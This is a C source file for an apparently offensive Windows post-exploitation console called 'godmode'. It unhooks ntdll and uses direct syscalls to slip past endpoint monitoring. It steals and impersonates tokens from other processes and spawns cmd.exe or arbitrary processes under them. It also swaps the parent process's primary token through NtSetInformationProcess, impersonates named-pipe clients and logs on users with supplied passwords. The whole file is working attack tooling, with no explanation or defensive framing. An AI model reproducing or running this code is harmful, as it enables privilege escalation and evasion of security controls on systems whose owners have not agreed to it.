#include <stdio.h>
#include <Windows.h>
#include <minwindef.h>
#include <winternl.h>

#include "syscalls.h"
#include "unhook.h"
#include "systeminfo.h"
#include "token.h"
#include "privileges.h"

#ifndef MAKEULONGLONG
#define MAKEULONGLONG(ldw, hdw) 
#endif

#ifndef MAXULONGLONG
#define MAXULONGLONG ((ULONGLONG)~((ULONGLONG)0))
#endif

#define MAX_COMMAND_BUFFER_LEN 256
#define PROMPT "\n# "

int main()
{
    BOOL should_exit = FALSE;
    BOOL is_impersonating = FALSE;

    printf("[*] Unhooking ntdll...\n");
    unhookNtdll();

    printf("[*] Resolving syscalls...\n");
    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    if (!get_syscalls(hNtdll))
    {
        return 1;
    }

    print_version();


    while (!should_exit)
    {
        printf(PROMPT);
        char command_buf[MAX_COMMAND_BUFFER_LEN];

        scanf_s("%255s", &command_buf, MAX_COMMAND_BUFFER_LEN);

        if (strcmp(command_buf, "exit") == 0)
        {
            should_exit = TRUE;
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Priv Module 

        else if (strcmp(command_buf, "priv.debug") == 0)
        {
            enable_privilege(is_impersonating, SE_DEBUG_NAME);
        }

        else if (strcmp(command_buf, "priv.impersonate") == 0)
        {
            enable_privilege(is_impersonating, SE_IMPERSONATE_NAME);
        }

        else if (strcmp(command_buf, "priv.assign") == 0)
        {
            enable_privilege(is_impersonating, SE_ASSIGNPRIMARYTOKEN_NAME);
        }

        // ------------------------------------------------------------------------------------------------------------------
        // Token Module

        else if (strcmp(command_buf, "token.current") == 0)
        {
            // Access token
            HANDLE currentToken;
            OpenProcessToken(GetCurrentProcess(), TOKEN_READ, &currentToken);
            Token t;
            t.tokenHandle = currentToken;
            get_token_information(&t);
            printf("Access Token: %ws\n", t.tokenUsername);

            // Impersonation token
            t.tokenHandle = GetCurrentThreadToken();
            get_token_information(&t);
            printf("Impersonated Client: %ws\n", t.tokenUsername);
        }
        else if (strcmp(command_buf, "token.list") == 0)
        {
            Token availableTokens[1024];
            list_available_tokens(availableTokens);
        }
        else if ((strcmp(command_buf, "token.cmd") == 0) || (strcmp(command_buf, "token.run") == 0))
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for token impersonation");
                continue;
            }

            Token availableTokens[1024];
            list_available_tokens(availableTokens);

            printf("Enter token ID to use: ");
            int token_id;
            scanf_s("%d", &token_id);
            printf("\n"); 

            Token tokenToUse = availableTokens[token_id];

            if (strcmp(command_buf, "token.cmd") == 0)
            {
                run_cmd(&tokenToUse, L"C:\\Windows\\system32\\cmd.exe");
            }
            else // token.run
            {
                printf("Enter command to run: ");
                wchar_t cmd_to_run[MAX_PATH];
                scanf_s("%ws", cmd_to_run, MAX_PATH);
                run_cmd(&tokenToUse, cmd_to_run);
            }
        }
        else if (strcmp(command_buf, "token.impersonate") == 0)
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for token impersonation");
                continue;
            }

            Token availableTokens[1024];
            list_available_tokens(availableTokens);

            printf("Enter token ID to use: ");
            int token_id;
            scanf_s("%d", &token_id);
            printf("\n");

            is_impersonating = impersonate(&availableTokens[token_id]);
        }
        else if (strcmp(command_buf, "token.parent") == 0)
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonatePrivilege is needed for setting the parents token");
                continue;
            }

            if (!enable_privilege(is_impersonating, SE_ASSIGNPRIMARYTOKEN_NAME))
            {
                printf("[!] SeAssignPrimaryToken is needed for setting the parents token");
                continue;
            }

            Token availableTokens[1024];
            list_available_tokens(availableTokens);

            printf("Enter token ID to use: ");
            int token_id;
            scanf_s("%d", &token_id);
            printf("\n");

            // Set parents impersonation token to the chosen token
            
            // Get parent PID
            HANDLE hSnapshots = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            PROCESSENTRY32 currProcessEntry = { 0 };
            currProcessEntry.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshots, &currProcessEntry))
            {
                do 
                {
                    if (currProcessEntry.th32ProcessID == GetCurrentProcessId())
                    {
                        printf("[*] PPID: %i\n", currProcessEntry.th32ParentProcessID);
                        break;
                    }
                } while (Process32Next(hSnapshots, &currProcessEntry));
            }
            CloseHandle(hSnapshots);

            // Get handle to parent proc 
            HANDLE hParentProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, currProcessEntry.th32ParentProcessID);

            // Get main thread of parent proc
            DWORD dwMainThreadID = 0;
            HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            THREADENTRY32 currThreadHandle;
            ULONGLONG ullMinCreateTime = MAXULONGLONG;
            currThreadHandle.dwSize = sizeof(THREADENTRY32);
            if (Thread32First(hThreadSnap, &currThreadHandle))
            {
                do
                {
                    if (currThreadHandle.th32OwnerProcessID == currProcessEntry.th32ParentProcessID)
                    {
                        HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, currThreadHandle.th32ThreadID);
                        if (hThread) 
                        {
                            FILETIME afTimes[4] = { 0 };
                            if (GetThreadTimes(hThread, &afTimes[0], &afTimes[1], &afTimes[2], &afTimes[3])) 
                            {
                                ULONGLONG ullTest = (((ULONGLONG)(afTimes[0].dwLowDateTime)) << 32) | ((afTimes[0].dwHighDateTime) & 0xFFFFFFFF);
                                if (ullTest && ullTest < ullMinCreateTime)
                                {
                                    ullMinCreateTime = ullTest;
                                    dwMainThreadID = currThreadHandle.th32ThreadID;
                                }
                            }
                            CloseHandle(hThread);
                        }
                    }
                } while (Thread32Next(hThreadSnap, &currThreadHandle));
            }
            CloseHandle(hThreadSnap);

            printf("[*] Suspending thread %d", dwMainThreadID);
            HANDLE remoteThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwMainThreadID);
            if (SuspendThread(remoteThread) == (DWORD)-1)
            {
                printf("[!] Error suspending thread with ID %d: %d", dwMainThreadID, GetLastError());
                continue;
            }

            // NtSetInformationProcess to set thread token
            PROCESS_ACCESS_TOKEN tokenInfo;
            tokenInfo.Token = availableTokens[token_id].tokenHandle;
            tokenInfo.Thread = 0;
            printf("[*] Setting token for thread %d", dwMainThreadID);
            NTSTATUS setInfoResult = sNtSetInformationProcess(hParentProc, 9, &tokenInfo, sizeof(PROCESS_ACCESS_TOKEN)); // 9 = ProcessAccessToken
            if (setInfoResult < 0)
            {
                wprintf(L"Error setting token: 0x%08x. Err: %d\n", setInfoResult, GetLastError());
                continue;
            }
            
            printf("[*] Resuming thread %d", dwMainThreadID);
            if (!ResumeThread(remoteThread))
            {
                printf("[!] Error resuming thread with ID %d: %d", dwMainThreadID, GetLastError());
            }
            
            // TODO: close handles
            continue;
        }
        else if (strcmp(command_buf, "token.revert") == 0)
        {
            RevertToSelf();
            is_impersonating = FALSE;
        }
        else if (strcmp(command_buf, "token.pipe") == 0)
        {
            if (!enable_privilege(is_impersonating, SE_IMPERSONATE_NAME))
            {
                printf("[!] SeImpersonate is needed for token impersonation");
                continue;
            }
            setup_pipe_and_impersonate();
        }
        else if (strcmp(command_buf, "token.logon") == 0)
        {
            HANDLE newLogonToken;
            wchar_t lpszUsername[MAX_PATH], lpszDomain[MAX_PATH], lpszPassword[MAX_PATH];

            printf("Enter domain: ");
            scanf_s("%ws", lpszDomain, MAX_PATH);
            printf("Enter username: ");
            scanf_s("%ws", lpszUsername, MAX_PATH);
            printf("Enter password: ");
            scanf_s("%ws", lpszPassword, MAX_PATH);

            if (!LogonUserW(lpszUsername, lpszDomain, lpszPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newLogonToken))
            {
                printf("[!] LogonUserW failed: %i", GetLastError());
            }
            else
            {
                printf("[*] User logged on. Creating cmd.exe process as user in background...");
                STARTUPINFO si;
                PROCESS_INFORMATION pi;

                if (!enable_privilege(is_impersonating, SE_INCREASE_QUOTA_NAME))
                {
                    printf("[!] SeIncreaseQuota is needed for token impersonation");
                    continue;
                }

                if (!enable_privilege(is_impersonating, SE_ASSIGNPRIMARYTOKEN_NAME))
                {
                    printf("[!] SeAssignPrimaryToken is needed for token impersonation");
                    continue;
                }

                if (!CreateProcessAsUserW(newLogonToken, L"C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
                {
                    printf("[!] ERROR: Could not create process with token: %d\n", GetLastError());
                    continue;
                }

                printf("[*] User logged on. See token.list\n");
            }
        }

        // ------------------------------------------------------------------------------------------------------------------

        else
        {
            printf("priv module:\n");
            printf("\tpriv.debug - enable debug priv\n");
            printf("\tpriv.assign - enable assignprimarytoken priv\n");
            printf("\tpriv.impersonate - enable impersonate priv\n");
            printf("\n");
            printf("token module:\n");
            printf("\ttoken.current - show current security tokens\n");
            printf("\ttoken.revert - revert to self\n");
            printf("\ttoken.list - list available tokens for all system processes\n");
            printf("\ttoken.cmd - run cmd.exe with a token from token.list\n");
            printf("\ttoken.run - run any process with a token from token.list\n");
            printf("\ttoken.impersonate - impersonate a token from token.list\n");
            printf("\ttoken.logon - logon a user with a password and run cmd.exe if assignprimraytoken priv is enabled\n");
            printf("\ttoken.pipe - create a named pipe and run cmd.exe, impersonating the first client that connects to it\n");
            printf("\n");
            printf("\texit - exit godmode\n");
        }
    }

    return 0;
}
